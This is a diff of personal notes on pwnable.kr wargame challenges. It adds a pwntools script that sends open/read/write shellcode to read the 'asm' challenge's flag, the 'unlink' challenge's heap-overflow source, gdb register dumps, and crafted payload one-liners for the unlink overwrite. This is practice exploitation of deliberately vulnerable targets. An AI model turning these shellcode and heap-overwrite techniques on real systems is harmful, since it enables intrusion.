@@ -779,71 +779,118 @@ python memcpy.py
 -----------------------------------------
 asm
 
+from pwn import *
+
+con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
+p = con.connect_remote('localhost', 9026)
+
+context(arch='amd64', os='linux')
+
+shellcode = ''
+shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
+shellcode += shellcraft.open('rsp', 0, 0)
+shellcode += shellcraft.read('rax', 'rsp', 100)
+shellcode += shellcraft.write(1, 'rsp', 100)
+
+
+print(shellcode)
+
+p.recvuntil('shellcode: ')
+p.send(asm(shellcode))
+output = p.recvline()
+print(output)
+
+I found a really convenient way to send shellcode online. Obviously I'm keeping this saved (not my work ofc) for future reference here.
+
+
+-----------------------------------------
+unlink
+
 #include <stdio.h>
-#include <string.h>
 #include <stdlib.h>
-#include <sys/mman.h>
-#include <seccomp.h>
-#include <sys/prctl.h>
-#include <fcntl.h>
-#include <unistd.h>
+#include <string.h>
+typedef struct tagOBJ{
+   struct tagOBJ* fd;
+   struct tagOBJ* bk;
+   char buf[8];
+}OBJ;
 
-#define LENGTH 128
-
-void sandbox(){
-   scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
-   if (ctx == NULL) {
-      printf("seccomp error\n");
-      exit(0);
-   }
-
-   seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
-   seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
-   seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
-   seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
-   seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
-
-   if (seccomp_load(ctx) < 0){
-      seccomp_release(ctx);
-      printf("seccomp error\n");
-      exit(0);
-   }
-   seccomp_release(ctx);
+void shell(){
+   system("/bin/sh");
 }
 
-char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
-unsigned char filter[256];
+void unlink(OBJ* P){
+   OBJ* BK;
+   OBJ* FD;
+   BK=P->bk;
+   FD=P->fd;
+   FD->bk=BK;
+   BK->fd=FD;
+}
 int main(int argc, char* argv[]){
+   malloc(1024);
+   OBJ* A = (OBJ*)malloc(sizeof(OBJ));
+   OBJ* B = (OBJ*)malloc(sizeof(OBJ));
+   OBJ* C = (OBJ*)malloc(sizeof(OBJ));
 
-   setvbuf(stdout, 0, _IONBF, 0);
-   setvbuf(stdin, 0, _IOLBF, 0);
+   // double linked list: A <-> B <-> C
+   A->fd = B;
+   B->bk = A;
+   B->fd = C;
+   C->bk = B;
 
-   printf("Welcome to shellcoding practice challenge.\n");
-   printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
-   printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
-   printf("If this does not challenge you. you should play 'asg' challenge :)\n");
+   printf("here is stack address leak: %p\n", &A);
+   printf("here is heap address leak: %p\n", A);
+   printf("now that you have leaks, get shell!\n");
+   // heap overflow!
+   gets(A->buf);
 
-   char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
-   memset(sh, 0x90, 0x1000);
-   memcpy(sh, stub, strlen(stub));
-   
-   int offset = sizeof(stub);
-   printf("give me your x64 shellcode: ");
-   read(0, sh+offset, 1000);
-
-   alarm(10);
-   chroot("/home/asm_pwn");   // you are in chroot jail. so you can't use symlink in /tmp
-   sandbox();
-   ((void (*)(void))sh)();
+   // exploit this unlink!
+   unlink(B);
    return 0;
 }
 
- 7ad: e8 8e fe ff ff          callq  640 <fopen@plt>
- 7b2: 48 89 45 f8             mov    %rax,-0x8(%rbp)
-mov    -0xc(%rbp),%eax
- 7c2: 89 c7                   mov    %eax,%edi
- 7c4: e8 47 fe ff ff          callq  610 <putchar@plt>
- 7c9: 48 8b 45 f8             mov    -0x8(%rbp),%rax
- 7cd: 48 89 c7                mov    %rax,%rdi
- 7d0: e8 5b fe ff ff          callq  630 <_IO_getc@plt>
- 7d5: 89 45 f4                mov    %eax,-0xc(%rbp)
+=> 0x8048521 <unlink+29>:  mov    DWORD PTR [eax+0x4],edx
+
+Program's segfaulting here after flooding it with AAAAAA input.
+It's trying to store the value of edx ("AAAA") into memory address (0x41414141 + 4).
+Obviously, there's a lot of potential here... I just need to figure out how to control it.
+
+So I send it
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+gdb-peda$ x/x $eax+0x4
+0x45454549: Cannot access memory at address 0x45454549
+gdb-peda$ info registers
+eax            0x45454545  0x45454545
+ecx            0xfbad2288  0xfbad2288
+edx            0x46464646  0x46464646
+ebx            0x0   0x0
+esp            0xbfeb8a28  0xbfeb8a28
+ebp            0xbfeb8a38  0xbfeb8a38
+esi            0x1   0x1
+edi            0xb76ea000  0xb76ea000
+eip            0x8048521   0x8048521 <unlink+29>
+eflags         0x286 [ PF SF IF ]
+cs             0x73  0x73
+ss             0x7b  0x7b
+ds             0x7b  0x7b
+es             0x7b  0x7b
+fs             0x0   0x0
+gs             0x33  0x33
+
+Now I can see that it's trying to store 0x46464646 (FFFF) into $0x45454549 (EEEE + 0x4). 
+
+python -c 'print "AAAA" * 4 + "\x28\x85\x04\x08" + "\xeb\x84\x04\x08"'
+
+python -c 'print "AAAA" * 4 + "\x74\x4f\xfd\xbf" + "AAAA"'
+
+Don't forget to add 4....
+
+Tips: 
+Start up GDB
+Start up python script, send all the input you need
+make sure to include connection.interactive()
+locate the PID stated in the script output
+use GDB to type 'attach PID' (obv replace PID)
+then you can use GDB as usual (you may have to type c in both terminals)
